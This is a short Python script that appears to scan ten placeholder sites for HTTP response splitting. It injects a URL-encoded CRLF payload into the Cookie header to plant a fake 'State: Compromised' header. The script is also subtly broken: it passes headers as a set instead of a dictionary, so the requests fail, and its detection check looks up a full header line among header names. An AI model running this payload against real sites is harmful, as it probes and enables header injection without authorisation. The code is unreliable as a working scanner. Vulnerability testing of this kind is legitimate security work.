import requests

for n in range(0,10):
	res = requests.get("https://example" + str(n) + "/name_space", headers={"Cookie:value" + str(n)})
	if res.status_code == 200 or res.status_code == 302:
		print("Success")
		r = requests.get("https://example" + str(n) + "/name_space", headers={"Cookie:value" + str(n) + "%0d%0aHTTP_RESPONSE%3dYES%0d%0aState:%20Compromised"})
		if r.status_code == 200 or r.status_code == 302:
			if "State: Compromised" in r.headers:
				print("Website " + str(n) + " is vulnerable to Response Splitting")  
	elif res.status_code == 404:
		print("Wepage " + str(n) + " not found")
	else:
		print("An error has occured, Please check the webiste. ")
